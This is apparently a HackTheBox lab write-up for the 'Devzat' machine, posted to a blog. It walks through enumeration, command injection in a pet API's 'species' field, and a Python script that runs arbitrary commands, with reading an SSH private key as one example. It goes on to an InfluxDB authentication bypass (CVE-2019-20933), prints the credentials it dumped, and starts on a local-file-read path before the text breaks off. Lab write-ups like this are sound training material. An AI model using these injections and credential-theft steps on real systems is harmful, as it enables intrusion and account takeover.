<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Devzat" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/devzat/" /><meta property="og:url" content="https://x00tex.github.io/posts/devzat/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/devzat/devzat_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-26T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/devzat/devzat_banner.png" /><meta property="twitter:title" content="Hackthebox - Devzat" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-26T18:30:00+00:00","datePublished":"2021-11-26T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Devzat","image":"https://x00tex.github.io/assets/img/posts/devzat/devzat_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/devzat/"},"url":"https://x00tex.github.io/posts/devzat/"}</script><title>Hackthebox - Devzat | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Devzat</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Devzat</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1637951400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-11-26 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1171 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/devzat/devzat_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.11.118 devzat.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 <span class="o">(</span>RSA<span class="o">)</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V<span class="o">=</span>7.91SVN%I<span class="o">=</span>7%D<span class="o">=</span>11/26%Time<span class="o">=</span>61A0C256%P<span class="o">=</span>x86_64-unknown-linux
SF:-gnu%r<span class="o">(</span>NULL,C,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-Go</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: devzat.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><ul><li>Port 8000 is running a ssh messaging server: <a href="https://github.com/quackduck/devzat">devzat</a><li>Found email from webapp: <code class="language-plaintext highlighter-rouge">patrick@devzat.htb</code><ul><li>Username: <code class="language-plaintext highlighter-rouge">patrick</code></ul></ul><p>Running subdomain scan with ffuf</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.devzat.htb"</span> <span class="nt">-u</span> http://10.10.11.118 <span class="nt">-ac</span> <span class="nt">-t</span> 100 <span class="nt">-v</span>

<span class="c"># ... [snip] ...</span>

<span class="o">[</span>Status: 200, Size: 510, Words: 20, Lines: 21, Duration: 343ms]
| URL | http://10.10.11.118
    <span class="k">*</span> FUZZ: pets
</pre></table></code></div></div><ul><li>found subdomain: <code class="language-plaintext highlighter-rouge">pets.devzat.htb</code></ul><p>subdomain is running on api and fetch pets from <code class="language-plaintext highlighter-rouge">/api/pet</code> endpoint.</p><p><img data-src="/assets/img/posts/devzat/pet-page.png" alt="" data-proofer-ignore></p><h1 id="foothold">Foothold</h1><h2 id="command-injection"><span class="mr-2">Command Injection</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>there is a feature to add pet in the list, while testing this feature i notice a suspicious error.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s1">'http://pets.devzat.htb/api/pet'</span> <span class="nt">-d</span> <span class="s1">$'{"name":"cat","species":"test"}'</span> 1&gt;/dev/null<span class="p">;</span> curl <span class="nt">-s</span> <span class="s1">'http://pets.devzat.htb/api/pet'</span> | <span class="nb">tr</span> <span class="s1">'{'</span> <span class="s1">'\n'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1
<span class="s2">"name"</span>:<span class="s2">"cat"</span>,<span class="s2">"species"</span>:<span class="s2">"test"</span>,<span class="s2">"characteristics"</span>:<span class="s2">"exit status 1"</span><span class="o">}]</span>

curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s1">'http://pets.devzat.htb/api/pet'</span> <span class="nt">-d</span> <span class="s1">$'{"name":"cat","species":"test</span><span class="se">\'</span><span class="s1">"}'</span> 1&gt;/dev/null<span class="p">;</span> curl <span class="nt">-s</span> <span class="s1">'http://pets.devzat.htb/api/pet'</span> | <span class="nb">tr</span> <span class="s1">'{'</span> <span class="s1">'\n'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1
<span class="s2">"name"</span>:<span class="s2">"cat"</span>,<span class="s2">"species"</span>:<span class="s2">"test'"</span>,<span class="s2">"characteristics"</span>:<span class="s2">"exit status 2"</span><span class="o">}]</span>
</pre></table></code></div></div><p>There errors are related to bash script. ;<strong><a href="https://www.redhat.com/sysadmin/exit-codes-demystified">Source</a></strong></p><p>When i send the POST request with “species” value that is not defined, get response “exit status 1” and when i add extra <code class="language-plaintext highlighter-rouge">'</code> in the “species” value get the response “exit status 2”. These errors match the bash <a href="https://tldp.org/LDP/abs/html/exitcodes.html">exit code reference</a></p><p>If “species” parameter goes into a bash script then this could be command injection.</p><p>And this is indeed a command injection bug</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s1">'http://pets.devzat.htb/api/pet'</span> <span class="nt">-d</span> <span class="s1">$'{"name":"cat","species":";id"}'</span> 1&gt;/dev/null<span class="p">;</span> curl <span class="nt">-s</span> <span class="s1">'http://pets.devzat.htb/api/pet'</span> | <span class="nb">tr</span> <span class="s1">'{'</span> <span class="s1">'\n'</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1
<span class="s2">"name"</span>:<span class="s2">"cat"</span>,<span class="s2">"species"</span>:<span class="s2">";id"</span>,<span class="s2">"characteristics"</span>:<span class="s2">"cat: characteristics/: Is a directory</span><span class="se">\n</span><span class="s2">uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)</span><span class="se">\n</span><span class="s2">"</span><span class="o">}]</span>
</pre></table></code></div></div><p>python script to beautify command output</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>

<span class="n">cmd</span> <span class="o">=</span> <span class="s">'ls -la'</span>  <span class="c1"># 'cat /home/patrick/.ssh/id_rsa'
</span><span class="n">postrspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://pets.devzat.htb/api/pet'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"cat"</span><span class="p">,</span> <span class="s">"species"</span><span class="p">:</span> <span class="sa">f</span><span class="s">";</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">"</span><span class="p">})</span>
<span class="k">if</span> <span class="s">'Pet was added successfully'</span> <span class="ow">in</span> <span class="n">postrspn</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
    <span class="n">getrspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://pets.devzat.htb/api/pet'</span><span class="p">)</span>
    <span class="n">parse</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'elephant."},(.*?)"}]'</span><span class="p">,</span> <span class="n">getrspn</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'unicode_escape'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">parse</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">postrspn</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>from <code class="language-plaintext highlighter-rouge">/home/patrick/</code> get ssh private key for that user.</p><h1 id="privesc">Privesc</h1><h2 id="influxdb-authentication-bypass-vulnerability"><span class="mr-2">InfluxDB authentication bypass vulnerability</span><a href="#influxdb-authentication-bypass-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are some local services running.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>LISTEN    0         4096             127.0.0.1:8086             0.0.0.0:<span class="k">*</span>
LISTEN    0         4096             127.0.0.1:8443             0.0.0.0:<span class="k">*</span>
</pre></table></code></div></div><p>port 8086 Running InfluxDB http admin 1.7.5</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>patrick@devzat:~<span class="nv">$ </span>curl <span class="nt">-i</span> 127.0.0.1:8086
HTTP/1.1 404 Not Found
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
X-Content-Type-Options: nosniff
X-Influxdb-Build: OSS
X-Influxdb-Version: 1.7.5
Date: Sat, 27 Nov 2021 08:58:29 GMT
Content-Length: 19

404 page not found
</pre></table></code></div></div><ul><li><strong><a href="https://www.influxdata.com/">InfluxDB</a></strong> is an open-source time series database developed by the company InfluxData. It is written in the Go programming language for storage and retrieval of time series data in fields such as operations monitoring, application metrics, Internet of Things sensor data, and real-time analytics.</ul><p>Found auth authentication <a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">CVE-2019-20933</a> from <a href="https://book.hacktricks.xyz/pentesting/8086-pentesting-influxdb#authentication">hacktricks</a></p><p>Exploit required some modules which are not available in the target box.</p><p>Setup local environment for the exploit</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ ssh <span class="nt">-L</span> 8086:127.0.0.1:8086 <span class="nt">-i</span> patrick_rsa patrick@10.10.11.118
❯ python3 <span class="nt">-m</span> venv <span class="nb">env</span>
❯ <span class="nb">source env</span>/bin/activate
❯ python <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
</pre></table></code></div></div><p>Default username “admin” worked and successfully bypass authentication and from database get the bunch of usernames and passwords.</p><p><img data-src="/assets/img/posts/devzat/influx-db.png" alt="" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>wilhelm:WillyWonka2021
catherine:woBeeYareedahc7Oogeephies7Aiseci
charles:RoyalQueenBee<span class="err">$</span>
</pre></table></code></div></div><p>User “catherine” is in the system and his password worked with su.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># ...[snip]...</span>
root         859  0.0  0.1   6812  3004 ?        Ss   Nov26   0:00 /usr/sbin/cron <span class="nt">-f</span>
patrick      861  0.0  0.1   6892  2192 ?        Ss   Nov26   0:00 /bin/bash /home/patrick/pets/start.sh
<span class="c"># ...[snip]...</span>
</pre></table></code></div></div><p>There are 2 zip file in <code class="language-plaintext highlighter-rouge">/var/bachup</code> directory owned by user “catherine”</p><p>unzipping both archives and running both directory against <code class="language-plaintext highlighter-rouge">diff</code> found only 3 file different to each other.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>diff main/allusers.json dev/allusers.json
diff main/commands.go dev/commands.go
diff main/devchat.go dev/devchat.go

<span class="c">#one extra file in "dev"</span>
Only <span class="k">in </span>dev/: testfile.txt
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">dev/commands.go</code> have some extra code which contains a password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>diff main/ dev/
<span class="c"># ...[snip]...</span>
<span class="o">&gt;</span> 	// Check my secure password
<span class="o">&gt;</span> 	<span class="k">if </span>pass <span class="o">!=</span> <span class="s2">"CeilingCatStillAThingIn2021?"</span> <span class="o">{</span>
<span class="o">&gt;</span> 		u.system<span class="o">(</span><span class="s2">"You did provide the wrong password"</span><span class="o">)</span>
<span class="o">&gt;</span> 		<span class="k">return</span>
<span class="o">&gt;</span> 	<span class="o">}</span>
<span class="c"># ...[snip]...</span>
</pre></table></code></div></div><p>Found a password <code class="language-plaintext highlighter-rouge">CeilingCatStillAThingIn2021?</code> but not for user “root”</p><h2 id="lfi"><span class="mr-2">lfi</span><a href="#lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There is a one more service running on localhost, this port is running same app “devzat” but slightly different.</p><p>“devzat” one that is running on localhost is a dev version which have one extra command <code class="language-plaintext highlighter-rouge">/file</code></p><p><img data-src="/assets/img/posts/devzat/dev-devzat.png" alt="" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">diff</code> command already got that command source code</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">fileCommand</span><span class="p">(</span><span class="n">u</span> <span class="o">*</span><span class="n">user</span><span class="p">,</span> <span class="n">args</span> <span class="p">[]</span><span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">1</span> <span class="p">{</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"Please provide file to print and the password"</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">2</span> <span class="p">{</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"You need to provide the correct password to use this function"</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">path</span> <span class="o">:=</span> <span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]</span>
	<span class="n">pass</span> <span class="o">:=</span> <span class="n">args</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>

	<span class="c">// Check my secure password</span>
	<span class="k">if</span> <span class="n">pass</span> <span class="o">!=</span> <span class="s">"CeilingCatStillAThingIn2021?"</span> <span class="p">{</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"You did provide the wrong password"</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="c">// Get CWD</span>
	<span class="n">cwd</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Getwd</span><span class="p">()</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
	<span class="p">}</span>

	<span class="c">// Construct path to print</span>
	<span class="n">printPath</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>

	<span class="c">// Check if file exists</span>
	<span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Stat</span><span class="p">(</span><span class="n">printPath</span><span class="p">);</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="c">// exists, print</span>
		<span class="n">file</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Open</span><span class="p">(</span><span class="n">printPath</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
			<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong opening the file: %+v"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()))</span>
			<span class="k">return</span>
		<span class="p">}</span>
		<span class="k">defer</span> <span class="n">file</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

		<span class="n">scanner</span> <span class="o">:=</span> <span class="n">bufio</span><span class="o">.</span><span class="n">NewScanner</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">scanner</span><span class="o">.</span><span class="n">Scan</span><span class="p">()</span> <span class="p">{</span>
			<span class="n">u</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">scanner</span><span class="o">.</span><span class="n">Text</span><span class="p">())</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">scanner</span><span class="o">.</span><span class="n">Err</span><span class="p">();</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
